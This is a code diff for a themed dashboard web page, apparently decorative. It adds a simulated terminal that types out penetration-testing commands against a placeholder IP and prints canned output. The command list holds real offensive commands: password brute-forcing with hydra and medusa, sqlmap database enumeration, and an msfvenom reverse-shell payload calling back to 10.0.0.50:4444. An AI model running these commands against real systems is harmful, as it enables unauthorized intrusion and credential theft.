@@ -63,12 +63,50 @@
             0%, 49% { opacity: 1; }
             50%, 100% { opacity: 0; }
         }
-        .cursor-blink { animation: blink 1s step-end infinite; }
+        .cursor-blink {
+            display: inline-block;
+            width: 0.55em;
+            height: 1.05em;
+            background: #a1a1aa;
+            vertical-align: text-bottom;
+            margin-left: 1px;
+            animation: blink 1s step-end infinite;
+        }
         
         .scanline-bg {
             background-image: radial-gradient(rgba(63, 63, 70, 0.15) 1px, transparent 1px);
             background-size: 24px 24px;
         }
+
+        #terminal-output {
+            overflow-y: auto;
+            overflow-x: hidden;
+            scrollbar-width: thin;
+            scrollbar-color: #3f3f46 transparent;
+        }
+
+        #terminal-typed {
+            overflow-wrap: anywhere;
+            word-break: break-word;
+        }
+
+        .term-line {
+            white-space: pre-wrap;
+            word-break: break-word;
+            overflow-wrap: anywhere;
+            margin-bottom: 2px;
+            line-height: 1.45;
+            max-width: 100%;
+        }
+        .term-cmd { color: #e4e4e7; }
+        .term-prompt { color: #06b6d4; }
+        .term-output { color: #a1a1aa; }
+        .term-success { color: #22c55e; }
+        .term-error { color: #ef4444; }
+        .term-warn { color: #f59e0b; }
+        .term-info { color: #3b82f6; }
+        .term-purple { color: #8b5cf6; }
+        .term-cyan { color: #06b6d4; }
     </style>
 </head>
 
@@ -77,6 +115,7 @@
     <div class="absolute inset-0 z-0 pointer-events-none scanline-bg"></div>
 
     <div class="relative z-10 flex h-full flex-col w-full">
+        <!-- Header -->
         <header class="h-16 shrink-0 border-b border-surface-border bg-surface-base/85 backdrop-blur-sm px-6 lg:px-8 flex items-center justify-between">
             <div class="flex items-center gap-6 min-w-0">
                 <div class="flex items-center gap-3 shrink-0">
@@ -100,85 +139,90 @@
                     <span class="text-zinc-600">UTC</span>
                 </div>
                 <div class="h-4 w-px bg-surface-border hidden sm:block"></div>
+                
             </div>
         </header>
 
-        <main class="flex-1 min-h-0 overflow-hidden p-5 lg:p-6 grid grid-rows-[auto_minmax(0,1fr)] gap-5">
-            
-            <section class="grid grid-cols-1 lg:grid-cols-[minmax(0,1fr)_360px] gap-5 min-h-0">
-  <div class="flex flex-col gap-5 min-h-0">
-    <div class="grid grid-cols-2 md:grid-cols-3 xl:grid-cols-3 gap-4 shrink-0">
-      <div class="glass-panel p-4 rounded-2xl flex flex-col justify-between min-h-[110px]">
-        <div class="flex justify-between items-start mb-2">
-          <h2 class="text-[11px] font-medium text-zinc-500 uppercase tracking-wider m-0">Relay Throughput</h2>
-          <i data-lucide="arrow-down-right" class="w-4 h-4 text-brand-cyan block -mr-2"></i>
-        </div>
-        <div class="flex items-end gap-2">
-          <span class="text-3xl font-light text-zinc-100 font-mono data-value-glow" id="inbound-metric">0.0</span>
-          <span class="text-sm text-zinc-500 mb-1">Gbps</span>
-        </div>
-      </div>
+        <!-- Main Content: top dashboards / bottom full-width shell -->
+        <main class="flex-1 min-h-0 overflow-hidden p-4 lg:p-5 flex flex-col gap-4">
 
-      <div class="glass-panel p-4 rounded-2xl flex flex-col justify-between min-h-[110px]">
-        <div class="flex justify-between items-start mb-2">
-          <h2 class="text-[11px] font-medium text-zinc-500 uppercase tracking-wider m-0">Active Nodes</h2>
-          <i data-lucide="crosshair" class="w-4 h-4 text-brand-red block -mr-2"></i>
-        </div>
-        <div class="flex items-end gap-2">
-          <span class="text-3xl font-light text-zinc-100 font-mono" id="hosts-metric">1,842</span>
-        </div>
-      </div>
+            <!-- TOP: Metrics + Chart -->
+            <div class="shrink-0 flex flex-col gap-4" style="height: min(38vh, 320px);">
+                <!-- Metrics -->
+                <section class="grid grid-cols-3 gap-3 shrink-0">
+                    <div class="glass-panel p-3 lg:p-4 rounded-2xl flex flex-col justify-between min-h-[88px]">
+                        <div class="flex justify-between items-start mb-1">
+                            <h2 class="text-[11px] font-medium text-zinc-500 uppercase tracking-wider m-0">Relay Throughput</h2>
+                            <i data-lucide="arrow-down-right" class="w-4 h-4 text-brand-cyan"></i>
+                        </div>
+                        <div class="flex items-end gap-2">
+                            <span class="text-2xl lg:text-3xl font-light text-zinc-100 font-mono data-value-glow" id="inbound-metric">0.0</span>
+                            <span class="text-sm text-zinc-500 mb-0.5">Gbps</span>
+                        </div>
+                    </div>
 
-      <div class="glass-panel p-4 rounded-2xl flex flex-col justify-between min-h-[110px]">
-        <div class="flex justify-between items-start mb-2">
-          <h2 class="text-[11px] font-medium text-zinc-500 uppercase tracking-wider m-0">Outbound Packets</h2>
-          <i data-lucide="database-zap" class="w-4 h-4 text-brand-purple block -mr-2"></i>
-        </div>
-        <div class="flex items-end gap-2">
-          <span class="text-3xl font-light text-zinc-100 font-mono" id="exfil-metric">847</span>
-          <span class="text-sm text-zinc-500 mb-1">GB</span>
-        </div>
-      </div>
-    </div>
+                    <div class="glass-panel p-3 lg:p-4 rounded-2xl flex flex-col justify-between min-h-[88px]">
+                        <div class="flex justify-between items-start mb-1">
+                            <h2 class="text-[11px] font-medium text-zinc-500 uppercase tracking-wider m-0">Active Nodes</h2>
+                            <i data-lucide="crosshair" class="w-4 h-4 text-brand-red"></i>
+                        </div>
+                        <div class="flex items-end gap-2">
+                            <span class="text-2xl lg:text-3xl font-light text-zinc-100 font-mono" id="hosts-metric">1,842</span>
+                        </div>
+                    </div>
 
-    <div class="glass-panel rounded-2xl p-5 flex flex-col min-h-0 overflow-hidden flex-1">
-      <div class="flex justify-between items-center mb-4 shrink-0">
-        <h2 class="text-sm font-medium text-zinc-300 m-0">Packet Trace</h2>
-        <div class="flex gap-4">
-          <span class="flex items-center text-xs text-zinc-500"><div class="w-2 h-2 rounded-full bg-brand-cyan mr-2"></div>AUX</span>
-          <span class="flex items-center text-xs text-zinc-500"><div class="w-2 h-2 rounded-full bg-brand-purple mr-2"></div>RAW</span>
-        </div>
-      </div>
-      <div class="relative flex-1 min-h-0 w-full">
-        <canvas id="telemetryChart"></canvas>
-      </div>
-    </div>
-  </div>
+                    <div class="glass-panel p-3 lg:p-4 rounded-2xl flex flex-col justify-between min-h-[88px]">
+                        <div class="flex justify-between items-start mb-1">
+                            <h2 class="text-[11px] font-medium text-zinc-500 uppercase tracking-wider m-0">Outbound Packets</h2>
+                            <i data-lucide="database-zap" class="w-4 h-4 text-brand-purple"></i>
+                        </div>
+                        <div class="flex items-end gap-2">
+                            <span class="text-2xl lg:text-3xl font-light text-zinc-100 font-mono" id="exfil-metric">847</span>
+                            <span class="text-sm text-zinc-500 mb-0.5">GB</span>
+                        </div>
+                    </div>
+                </section>
 
-  <div class="glass-panel rounded-2xl p-5 flex flex-col min-h-0 h-full">
-    <div class="flex justify-between items-center mb-4 shrink-0">
-      <div class="flex items-center gap-2.5">
-        <i data-lucide="terminal" class="w-4 h-4 text-zinc-400"></i>
-        <h2 class="text-sm font-medium text-zinc-300 m-0">Shell Console</h2>
-      </div>
-      <span class="flex items-center gap-1.5 text-[10px] font-mono text-brand-green bg-brand-green/10 px-2 py-1 rounded border border-brand-green/20">
-        <div class="w-1.5 h-1.5 rounded-full bg-brand-green animate-pulse"></div>
-        CONNECTED
-      </span>
-    </div>
+                <!-- Chart -->
+                <div class="glass-panel rounded-2xl p-4 flex flex-col flex-1 min-h-0 overflow-hidden">
+                    <div class="flex justify-between items-center mb-2 shrink-0">
+                        <h2 class="text-sm font-medium text-zinc-300 m-0">Packet Trace</h2>
+                        <div class="flex gap-4">
+                            <span class="flex items-center text-xs text-zinc-500"><div class="w-2 h-2 rounded-full bg-brand-cyan mr-2"></div>AUX</span>
+                            <span class="flex items-center text-xs text-zinc-500"><div class="w-2 h-2 rounded-full bg-brand-purple mr-2"></div>RAW</span>
+                        </div>
+                    </div>
+                    <div class="relative flex-1 min-h-0 w-full">
+                        <canvas id="telemetryChart"></canvas>
+                    </div>
+                </div>
+            </div>
 
-    <div class="flex-1 min-h-0 bg-black/40 rounded-xl border border-white/5 p-4 font-mono text-[12px] leading-relaxed overflow-hidden flex flex-col relative shadow-inner">
-      <div class="flex-1 min-h-0 relative overflow-hidden">
-        <div id="terminal-log-container" class="absolute bottom-0 left-0 right-0 flex flex-col justify-end"></div>
-      </div>
-      <div class="mt-3 flex items-center gap-2 text-zinc-400 shrink-0 border-t border-white/5 pt-2">
-        <span class="text-brand-cyan font-medium">root@overwatch</span>
-        <span class="text-zinc-600">~ $</span>
-        <span class="cursor-blink w-2 h-3.5 bg-zinc-400 inline-block align-middle"></span>
-      </div>
-    </div>
-  </div>
-</section>
+            <!-- BOTTOM: Full-width Shell Console -->
+            <div class="glass-panel rounded-2xl p-4 flex flex-col flex-1 min-h-0 overflow-hidden">
+                <div class="flex justify-between items-center mb-3 shrink-0">
+                    <div class="flex items-center gap-2.5">
+                        <i data-lucide="terminal" class="w-4 h-4 text-zinc-400"></i>
+                        <h2 class="text-sm font-medium text-zinc-300 m-0">Shell Console</h2>
+                    </div>
+                    <span class="flex items-center gap-1.5 text-[10px] font-mono text-brand-green bg-brand-green/10 px-2 py-1 rounded border border-brand-green/20">
+                        <div class="w-1.5 h-1.5 rounded-full bg-brand-green animate-pulse"></div>
+                        CONNECTED
+                    </span>
+                </div>
+
+                <div class="flex-1 min-h-0 bg-black/40 rounded-xl border border-white/5 p-3 font-mono text-[12px] leading-relaxed flex flex-col relative shadow-inner overflow-hidden" id="terminal-wrapper">
+                    <div id="terminal-output" class="flex-1 min-h-0 overflow-y-auto overflow-x-hidden pb-2"></div>
+                    <div class="flex items-baseline gap-1.5 text-zinc-400 shrink-0 border-t border-white/5 pt-2 mt-1 min-w-0 font-mono text-[12px] leading-[1.45]">
+                        <span class="text-brand-cyan font-medium shrink-0 whitespace-nowrap" id="prompt-user">root@overwatch</span>
+                        <span class="text-zinc-600 shrink-0 whitespace-nowrap" id="prompt-path">~ $</span>
+                        <span class="min-w-0 flex-1 text-zinc-100" style="overflow-wrap:anywhere;word-break:break-word;">
+                            <span id="terminal-typed"></span><span class="cursor-blink" id="terminal-caret"></span>
+                        </span>
+                    </div>
+                </div>
+            </div>
+
         </main>
     </div>
 
@@ -204,6 +248,11 @@
                 return new Date().toISOString().substring(11, 19);
             }
 
+            static getLocalTimeString() {
+                const d = new Date();
+                return d.toTimeString().substring(0, 8);
+            }
+
             static generateHex(length) {
                 let result = '';
                 const chars = '0123456789abcdef';
@@ -211,6 +260,10 @@
                     result += chars.charAt(Math.floor(Math.random() * chars.length));
                 }
                 return result;
+            }
+
+            static delay(ms) {
+                return new Promise(r => setTimeout(r, ms));
             }
         }
 
@@ -365,119 +418,824 @@
             }
         }
 
+        // ========== Shell Console ==========
         class TerminalConsole {
-            constructor(containerId) {
-                this.container = document.getElementById(containerId);
-                this.maxLines = 45; 
-                this.lines = [];    
-                this.init();
+            constructor() {
+                this.output = document.getElementById('terminal-output');
+                this.typedEl = document.getElementById('terminal-typed');
+                this.promptUser = document.getElementById('prompt-user');
+                this.promptPath = document.getElementById('prompt-path');
+                this.msfMode = false;
+                this.msfModule = null;
+                this.running = true;
+                this.recentHistory = []; // last up to 5 handlers / sequences
+                this.maxOutputLines = 250;
+                this.handlers = this.buildHandlers();
+
+                this.printWelcome();
+                setTimeout(() => this.runAutoDemo(), 1200);
             }
 
-            init() {
-                const fragment = document.createDocumentFragment();
-                for (let i = 0; i < this.maxLines; i++) {
-                    const row = this.createRowElement();
-                    this.updateRowContent(row, true); 
-                    this.lines.push(row);
-                    fragment.appendChild(row);
+            get target() {
+                return Utils.targetIP || '192.168.1.100';
+            }
+
+            // ----- DOM helpers -----
+            appendLine(html, cls = 'term-output') {
+                const div = document.createElement('div');
+                div.className = `term-line ${cls}`;
+                div.innerHTML = html;
+                this.output.appendChild(div);
+                while (this.output.childElementCount > this.maxOutputLines) {
+                    this.output.removeChild(this.output.firstElementChild);
                 }
-                this.container.appendChild(fragment);
-                this.startStreaming();
+                this.output.scrollTop = this.output.scrollHeight;
             }
 
-            createRowElement() {
-                const row = document.createElement('div');
-                row.className = 'flex gap-3 items-start min-w-0 font-mono text-[11px] leading-tight mb-1.5 opacity-90';
-                
-                const timeSpan = document.createElement('span');
-                timeSpan.className = 'text-zinc-600 shrink-0 whitespace-nowrap time-col';
-                
-                const tagSpan = document.createElement('span');
-                tagSpan.className = 'shrink-0 w-12 tag-col font-medium';
-                
-                const msgSpan = document.createElement('span');
-                msgSpan.className = 'min-w-0 break-words text-zinc-300 msg-col';
-
-                row.appendChild(timeSpan);
-                row.appendChild(tagSpan);
-                row.appendChild(msgSpan);
-                
-                return row;
+            appendLines(lines, cls = 'term-output') {
+                for (const line of lines) this.appendLine(line, cls);
             }
 
-            generateDynamicLog() {
-                const target = Utils.targetIP || '127.0.0.1';
-                const randomIp = Utils.generateRandomIP();
-                const port = [22, 21, 80, 443, 3389, 8080, 5432, 27017][Math.floor(Math.random() * 8)];
-                const hex = Utils.generateHex(8);
-                const pid = Math.floor(Utils.randomInRange(1000, 9999));
-                
-                const templates = [
-                    { tag: 'SCAN',  color: 'text-brand-cyan',   html: `Initiating Nmap stealth scan against <span class="text-zinc-100">${target}</span>...` },
-                    { tag: 'SCAN',  color: 'text-brand-cyan',   html: `Discovered open port <span class="text-brand-cyan">${port}/tcp</span> on ${target}` },
-                    { tag: 'SEC',   color: 'text-brand-amber',  html: `Bypassing IPS signatures for node <span class="text-zinc-100">${target}</span>...` },
-                    { tag: 'SEC',   color: 'text-brand-red',    html: `Intrusion detection alert ignored on <span class="text-zinc-100">${randomIp}</span>` },
-                    { tag: 'EXP',   color: 'text-brand-red',    html: `Injecting payload into process PID <span class="text-zinc-100">${pid}</span>` },
-                    { tag: 'EXP',   color: 'text-brand-red',    html: `Exploit triggered at memory offset <span class="text-zinc-400">0x${hex}</span>` },
-                    { tag: 'NET',   color: 'text-brand-purple', html: `Intercepting traffic routing from <span class="text-zinc-100">${randomIp}</span>` },
-                    { tag: 'NET',   color: 'text-brand-purple', html: `Rerouting socket to <span class="text-brand-cyan">${target}:${port}</span>` },
-                    { tag: 'SYS',   color: 'text-zinc-400',     html: `Allocating <span class="text-brand-cyan">4096 bytes</span> in <span class="text-zinc-500">0x${Utils.generateHex(8)}</span>` },
-                    { tag: 'SYS',   color: 'text-brand-green',  html: `Reverse shell session established with <span class="text-zinc-100">${target}</span>` },
-                    { tag: 'DUMP',  color: 'text-zinc-600',     html: `0x${Utils.generateHex(4)}: ${Utils.generateHex(2)} ${Utils.generateHex(2)} ${Utils.generateHex(2)} ${Utils.generateHex(2)} ${Utils.generateHex(2)}` },
-                ];
-                
-                return templates[Math.floor(Math.random() * templates.length)];
+            escapeHtml(str) {
+                return String(str)
+                    .replace(/&/g, '&amp;')
+                    .replace(/</g, '&lt;')
+                    .replace(/>/g, '&gt;');
             }
 
-            updateRowContent(rowElement, isInit = false) {
-                const logData = this.generateDynamicLog();
-                const timeStr = new Date().toISOString().substring(11, 19);
-
-                const [timeSpan, tagSpan, msgSpan] = rowElement.children;
-
-                if(isInit) {
-                     const pastTime = new Date(Date.now() - Math.random() * 600000);
-                     timeSpan.textContent = pastTime.toISOString().substring(11, 19);
+            setPrompt(msf = false, module = null) {
+                if (msf) {
+                    this.promptUser.textContent = 'msf';
+                    this.promptPath.innerHTML = module
+                        ? ` <span class="text-brand-purple">auxiliary(${module})</span> >`
+                        : ' >';
                 } else {
-                     timeSpan.textContent = timeStr;
+                    this.promptUser.textContent = 'root@overwatch';
+                    this.promptPath.textContent = '~ $';
                 }
-                
-                tagSpan.className = `shrink-0 w-12 font-medium ${logData.color}`;
-                tagSpan.textContent = `[${logData.tag}]`;
-                
-                msgSpan.innerHTML = logData.html;
             }
 
-            appendLog() {
-                const oldestRow = this.lines.shift();
-                this.updateRowContent(oldestRow);
-                
-                this.lines.push(oldestRow);
-                this.container.appendChild(oldestRow);
+            printWelcome() {
+                this.appendLines([
+                    'Linux overwatch 6.8.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali1 (2026-05-12) x86_64',
+                    '',
+                    'The programs included with the Kali GNU/Linux system are free software;',
+                    'the exact distribution terms for each program are described in the',
+                    'individual files in /usr/share/doc/*/copyright.',
+                    '',
+                    'Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent',
+                    'permitted by applicable law.',
+                    ''
+                ]);
             }
 
-            startStreaming() {
-                const logLoop = () => {
-                    this.appendLog();
-                    const nextDelay = Utils.randomInRange(200, 1400);
-                    setTimeout(logLoop, nextDelay);
+            // ----- Typing -----
+            async typeCommand(cmd, speed = 28) {
+                this.typedEl.textContent = '';
+                for (let i = 0; i < cmd.length; i++) {
+                    this.typedEl.textContent += cmd[i];
+                    await Utils.delay(speed + Math.random() * 18);
+                }
+                await Utils.delay(280);
+            }
+
+            async commitCommand(cmd) {
+                let promptHtml;
+                if (this.msfMode) {
+                    promptHtml = this.msfModule
+                        ? `<span class="term-prompt">msf</span> <span class="term-purple">auxiliary(${this.msfModule})</span> &gt; `
+                        : `<span class="term-prompt">msf</span> &gt; `;
+                } else {
+                    promptHtml = `<span class="term-prompt">root@overwatch</span> <span class="text-zinc-600">~ $</span> `;
+                }
+                this.appendLine(promptHtml + `<span class="term-cmd">${this.escapeHtml(cmd)}</span>`);
+                this.typedEl.textContent = '';
+            }
+
+            // ----- Command pool -----
+            getCommandPool() {
+                const t = this.target;
+                return [
+                    // recon
+                    { cmd: `nmap -sV -p- ${t}`, handler: 'nmap', weight: 3 },
+                    { cmd: `nmap -sS -T4 -Pn ${t}`, handler: 'nmap', weight: 2 },
+                    { cmd: `nmap -sC -sV -oA scan_${t.replace(/\./g, '_')} ${t}`, handler: 'nmap', weight: 2 },
+                    { cmd: `nmap -p 21,22,23,25,53,80,110,139,443,445,3306,3389,8080,8443 ${t}`, handler: 'nmap', weight: 2 },
+                    { cmd: `nmap -sU -sV --top-ports 20 ${t}`, handler: 'nmap_udp', weight: 1 },
+                    { cmd: `masscan ${t}/24 -p1-65535 --rate=1000`, handler: 'masscan', weight: 2 },
+
+                    // web
+                    { cmd: `curl -I -v http://${t}`, handler: 'curl', weight: 2 },
+                    { cmd: `curl -s -X POST http://${t}/login -d 'user=admin&pass=admin'`, handler: 'curl_post', weight: 2 },
+                    { cmd: `curl -s http://${t}/api/v1/users -H 'Authorization: Bearer eyJhbGciOi...'`, handler: 'curl_api', weight: 2 },
+                    { cmd: `wget -q -O - http://${t}/robots.txt`, handler: 'wget', weight: 1 },
+                    { cmd: `gobuster dir -u http://${t} -w /usr/share/wordlists/dirb/common.txt -t 50`, handler: 'gobuster', weight: 3 },
+                    { cmd: `ffuf -u http://${t}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,403`, handler: 'ffuf', weight: 2 },
+                    { cmd: `nikto -h http://${t}`, handler: 'nikto', weight: 2 },
+                    { cmd: `whatweb http://${t}`, handler: 'whatweb', weight: 1 },
+                    { cmd: `wafw00f http://${t}`, handler: 'wafw00f', weight: 1 },
+
+                    // injection / auth
+                    { cmd: `sqlmap -u "http://${t}/search.php?q=test" --batch --dbs`, handler: 'sqlmap', weight: 2 },
+                    { cmd: `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://${t}`, handler: 'hydra_ssh', weight: 2 },
+                    { cmd: `hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://${t}/login.php:username=^USER^&password=^PASS^:Invalid`, handler: 'hydra', weight: 2 },
+                    { cmd: `medusa -h ${t} -u admin -P /usr/share/wordlists/rockyou.txt -M ssh`, handler: 'medusa', weight: 1 },
+                    { cmd: `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`, handler: 'john', weight: 1 },
+                    { cmd: `hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`, handler: 'hashcat', weight: 1 },
+
+                    // network / capture
+                    { cmd: `nc -zv -w 2 ${t} 22 80 443 3306 8080 9000`, handler: 'nc', weight: 2 },
+                    { cmd: `tcpdump -i eth0 -n -c 10 'port 80 or port 443'`, handler: 'tcpdump', weight: 2 },
+                    { cmd: `tshark -i eth0 -c 5 -f 'tcp port 80'`, handler: 'tshark', weight: 1 },
+                    { cmd: `openssl s_client -connect ${t}:443 -servername ${t} </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates`, handler: 'openssl', weight: 2 },
+                    { cmd: `ping -c 4 ${t}`, handler: 'ping', weight: 1 },
+                    { cmd: `traceroute -n ${t}`, handler: 'traceroute', weight: 1 },
+
+                    // smb / windows
+                    { cmd: `enum4linux -a ${t}`, handler: 'enum4linux', weight: 2 },
+                    { cmd: `smbclient -L //${t} -N`, handler: 'smbclient', weight: 2 },
+                    { cmd: `rpcclient -U '' -N ${t}`, handler: 'rpcclient', weight: 1 },
+                    { cmd: `crackmapexec smb ${t} -u admin -p 'Password123!'`, handler: 'cme', weight: 2 },
+
+                    // exploit
+                    { cmd: 'msfconsole', handler: 'msfstart', weight: 2 },
+                    { cmd: `searchsploit apache 2.4`, handler: 'searchsploit', weight: 1 },
+                    { cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.50 LPORT=4444 -f elf -o /tmp/shell.elf`, handler: 'msfvenom', weight: 1 },
+                ];
+            }
+
+            remember(key) {
+                this.recentHistory.push(key);
+                if (this.recentHistory.length > 5) this.recentHistory.shift();
+            }
+
+            isRecent(key) {
+                return this.recentHistory.includes(key);
+            }
+
+            /**
+             * Weighted random pick among commands whose handler is not in the
+             * last 5 history entries. msfconsole is gated by 'msf_session'.
+             */
+            pickRandomCommand() {
+                const pool = this.getCommandPool();
+                let eligible = pool.filter((item) => {
+                    if (this.isRecent(item.handler)) return false;
+                    if (item.handler === 'msfstart' && this.isRecent('msf_session')) return false;
+                    return true;
+                });
+
+                // If exhausted, drop oldest history entries until something qualifies
+                if (eligible.length === 0) {
+                    while (this.recentHistory.length && eligible.length === 0) {
+                        this.recentHistory.shift();
+                        eligible = pool.filter((item) => {
+                            if (this.isRecent(item.handler)) return false;
+                            if (item.handler === 'msfstart' && this.isRecent('msf_session')) return false;
+                            return true;
+                        });
+                    }
+                }
+
+                if (eligible.length === 0) eligible = pool.slice();
+
+                const totalWeight = eligible.reduce((sum, item) => sum + (item.weight || 1), 0);
+                let r = Math.random() * totalWeight;
+                for (const item of eligible) {
+                    r -= (item.weight || 1);
+                    if (r <= 0) return item;
+                }
+                return eligible[eligible.length - 1];
+            }
+
+            // ----- Demo loop -----
+            async runAutoDemo() {
+                while (this.running) {
+                    const wantMsf = Math.random() < 0.14 && !this.isRecent('msf_session');
+                    if (wantMsf) {
+                        await this.runMsfSession();
+                        this.remember('msf_session');
+                        await Utils.delay(Utils.randomInRange(1000, 2000));
+                        continue;
+                    }
+
+                    const step = this.pickRandomCommand();
+                    if (step.handler === 'msfstart') {
+                        if (this.isRecent('msf_session')) {
+                            continue;
+                        }
+                        await this.runMsfSession();
+                        this.remember('msf_session');
+                        await Utils.delay(Utils.randomInRange(1000, 2000));
+                        continue;
+                    }
+
+                    await this.typeCommand(step.cmd, 20 + Math.random() * 22);
+                    await this.commitCommand(step.cmd);
+                    await this.dispatch(step.handler);
+                    this.remember(step.handler);
+                    await Utils.delay(Utils.randomInRange(800, 2400));
+                }
+            }
+
+            async runMsfSession() {
+                const t = this.target;
+                const steps = [
+                    { cmd: 'msfconsole', handler: 'msfstart' },
+                    { cmd: 'search smb_version', handler: 'msfsearch' },
+                    { cmd: 'use auxiliary/scanner/smb/smb_version', handler: 'msfuse' },
+                    { cmd: `set RHOSTS ${t}`, handler: 'msfset' },
+                    { cmd: 'run', handler: 'msfrun' },
+                    { cmd: 'exit', handler: 'msfexit' },
+                ];
+                for (const step of steps) {
+                    if (!this.running) break;
+                    await this.typeCommand(step.cmd, 22 + Math.random() * 18);
+                    await this.commitCommand(step.cmd);
+                    await this.dispatch(step.handler);
+                    await Utils.delay(Utils.randomInRange(450, 1200));
+                }
+            }
+
+            // ----- Dispatch -----
+            async dispatch(handler) {
+                const t = this.target;
+                const fn = this.handlers[handler];
+                if (typeof fn === 'function') {
+                    await fn.call(this, t);
+                } else {
+                    this.appendLine(`${handler}: command not found`);
+                }
+            }
+
+            buildHandlers() {
+                return {
+                    nmap: this.simNmap,
+                    nmap_udp: this.simNmapUdp,
+                    masscan: this.simMasscan,
+                    curl: this.simCurl,
+                    curl_post: this.simCurlPost,
+                    curl_api: this.simCurlApi,
+                    wget: this.simWget,
+                    gobuster: this.simGobuster,
+                    ffuf: this.simFfuf,
+                    nikto: this.simNikto,
+                    whatweb: this.simWhatweb,
+                    wafw00f: this.simWafw00f,
+                    sqlmap: this.simSqlmap,
+                    hydra: this.simHydra,
+                    hydra_ssh: this.simHydraSsh,
+                    medusa: this.simMedusa,
+                    john: this.simJohn,
+                    hashcat: this.simHashcat,
+                    nc: this.simNc,
+                    tcpdump: this.simTcpdump,
+                    tshark: this.simTshark,
+                    openssl: this.simOpenssl,
+                    ping: this.simPing,
+                    traceroute: this.simTraceroute,
+                    enum4linux: this.simEnum4linux,
+                    smbclient: this.simSmbclient,
+                    rpcclient: this.simRpcclient,
+                    cme: this.simCme,
+                    msfstart: this.startMsf,
+                    msfsearch: this.simMsfSearch,
+                    msfuse: this.simMsfUse,
+                    msfset: this.simMsfSet,
+                    msfrun: this.simMsfRun,
+                    msfexit: this.simMsfExit,
+                    searchsploit: this.simSearchsploit,
+                    msfvenom: this.simMsfvenom,
                 };
-                logLoop();
+            }
+
+            // ----- Tool simulations -----
+            async simNmap(t) {
+                this.appendLine(`Starting Nmap 7.95 ( https://nmap.org ) at ${new Date().toISOString().slice(0, 16).replace('T', ' ')} UTC`);
+                await Utils.delay(500);
+                this.appendLines([
+                    `Nmap scan report for ${t}`,
+                    `Host is up (0.0${Math.floor(Math.random() * 40) + 10}s latency).`,
+                    'Not shown: 65530 closed ports',
+                    '',
+                    'PORT      STATE SERVICE     VERSION',
+                    '22/tcp    open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.10',
+                    '80/tcp    open  http        Apache httpd 2.4.52',
+                    '443/tcp   open  https       Apache httpd 2.4.52',
+                    '3306/tcp  open  mysql       MySQL 8.0.36',
+                    '8080/tcp  open  http-proxy  Apache Tomcat 9.0.83',
+                    '',
+                    'Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .',
+                    `Nmap done: 1 IP address (1 host up) scanned in ${(Math.random() * 8 + 3).toFixed(2)} seconds`
+                ]);
+            }
+
+            async simNmapUdp(t) {
+                this.appendLines([
+                    `Starting Nmap 7.95 ( https://nmap.org ) at ${new Date().toISOString().slice(0, 16).replace('T', ' ')} UTC`,
+                    `Nmap scan report for ${t}`,
+                    'Host is up.',
+                    'PORT     STATE         SERVICE  VERSION',
+                    '53/udp   open          domain   dnsmasq 2.90',
+                    '123/udp  open          ntp      NTP v4',
+                    '137/udp  open|filtered netbios-ns',
+                    '161/udp  closed        snmp',
+                    `Nmap done: 1 IP address (1 host up) scanned in ${(Math.random() * 12 + 5).toFixed(2)} seconds`
+                ]);
+            }
+
+            async simMasscan(t) {
+                this.appendLines([
+                    'Starting masscan 1.3.2 (http://bit.ly/14GZzcT)',
+                    `Scanning ${t}/24 (256 hosts) at 1000 packets/second`
+                ]);
+                await Utils.delay(400);
+                this.appendLines([
+                    `Discovered open port 22/tcp on ${t}`,
+                    `Discovered open port 80/tcp on ${t}`,
+                    `Discovered open port 443/tcp on ${t}`,
+                    `Discovered open port 445/tcp on ${Utils.generateRandomIP()}`,
+                    `Discovered open port 3389/tcp on ${Utils.generateRandomIP()}`
+                ]);
+            }
+
+            async simCurl(t) {
+                this.appendLine(`*   Trying ${t}:80...`);
+                await Utils.delay(180);
+                this.appendLines([
+                    `* Connected to ${t} port 80 (#0)`,
+                    `> HEAD / HTTP/1.1`,
+                    `> Host: ${t}`,
+                    `> User-Agent: curl/8.5.0`,
+                    `> Accept: */*`,
+                    `>`
+                ]);
+                await Utils.delay(250);
+                this.appendLines([
+                    '< HTTP/1.1 200 OK',
+                    `< Date: ${new Date().toUTCString()}`,
+                    '< Server: Apache/2.4.52 (Ubuntu)',
+                    '< X-Powered-By: PHP/8.1.2',
+                    `< Set-Cookie: SESSIONID=${Utils.generateHex(16)}; Path=/; HttpOnly`,
+                    '< Content-Type: text/html; charset=UTF-8',
+                    '< Content-Length: 4523',
+                    '<'
+                ]);
+            }
+
+            async simCurlPost(t) {
+                this.appendLines([
+                    'HTTP/1.1 302 Found',
+                    'Location: /dashboard',
+                    `Set-Cookie: PHPSESSID=${Utils.generateHex(26)}; path=/`,
+                    'Content-Length: 0'
+                ]);
+            }
+
+            async simCurlApi(t) {
+                this.appendLine('[{"id":1,"username":"admin","role":"superuser"},{"id":2,"username":"jdoe","role":"user"},{"id":3,"username":"svc_backup","role":"operator"}]');
+            }
+
+            async simWget(t) {
+                this.appendLines([
+                    'User-agent: *',
+                    'Disallow: /admin/',
+                    'Disallow: /backup/',
+                    'Disallow: /config/'
+                ]);
+            }
+
+            async simGobuster(t) {
+                this.appendLines([
+                    '===============================================================',
+                    'Gobuster v3.6',
+                    'by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)',
+                    '===============================================================',
+                    `[+] Url:                     http://${t}`,
+                    '[+] Method:                  GET',
+                    '[+] Threads:                 50',
+                    '[+] Wordlist:                /usr/share/wordlists/dirb/common.txt',
+                    '[+] Status codes:            200,204,301,302,307,401,403',
+                    '===============================================================',
+                    `${new Date().toISOString().slice(0, 19).replace('T', ' ')} Starting gobuster in directory enumeration mode`,
+                    '==============================================================='
+                ]);
+                await Utils.delay(400);
+                const dirs = [['/admin', '301'], ['/api', '200'], ['/backup', '403'], ['/config', '200'], ['/login', '200'], ['/upload', '401'], ['/assets', '200'], ['/.git', '403']];
+                for (const [d, s] of dirs) {
+                    await Utils.delay(160);
